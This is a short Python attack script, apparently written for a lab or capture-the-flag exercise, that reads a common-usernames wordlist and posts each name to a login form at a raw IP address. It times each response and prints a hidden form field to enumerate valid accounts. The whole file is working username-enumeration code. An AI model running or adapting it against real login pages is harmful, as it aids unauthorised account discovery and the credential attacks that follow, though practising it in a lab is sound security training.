
import requests
import os
from bs4 import BeautifulSoup
import time

fd = open('top-usernames-shortlist.txt','r')
wordlist = fd.read()
fd.close()


usernames = list(wordlist.split('\n'))


url = "http://159.65.27.8:30427/question2/"

for i in usernames:
	data = {
		"Username":i,
		"wronguser":i,
		"count":1,
		"Password":"test"
	}

	t1 = time.perf_counter()
	r = requests.post(url,data=data)
	t2 = time.perf_counter()
	print("Time took to get response {}".format(t2-t1))
	res = r.text
	print("Payload : {}".format(i))
	bs = BeautifulSoup(r.content,'html.parser')
	for j in bs.find_all('input',{"name":"wronguser"}):
		print(j)

